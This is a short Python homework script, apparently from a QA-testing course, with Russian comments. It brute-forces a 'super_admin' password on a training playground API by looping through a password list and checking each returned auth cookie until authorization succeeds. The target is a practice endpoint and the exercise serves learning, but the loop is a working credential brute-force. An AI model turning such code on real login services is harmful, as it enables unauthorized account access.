import requests

params = {"login": "super_admin", "password": "21312"}
response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = params) #обрати внимание на дату

cookie = {"login": "super_admin", "password": "21312","auth_cookie": "cookie_value"}
response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", data = cookie)

n = 0
file = open("pass.txt", "r")#открываем файл для чтения
passlog = file.read() #переносим все содержимое в одну строку
passlog = passlog.split("	") #разделяем строку на список через разделитель в кавычках (табуляция)

while str(response.text) == str("You are NOT authorized"):
    params = {"login": "super_admin", "password": f"{passlog[n]}"} #вот так можно вставить переменную в параметры f "перед кавычками"

    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = params)

    cookie_value = response.cookies.get('auth_cookie') #вытаскиваем из запроса куки с помощью .get (надо узнать как работает)
    print(cookie_value)

    cookie = {"auth_cookie": f"{cookie_value}"}
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = cookie)
    print(response.text)

    print(passlog[n])
    print( "эн = ", n )
    n += 1

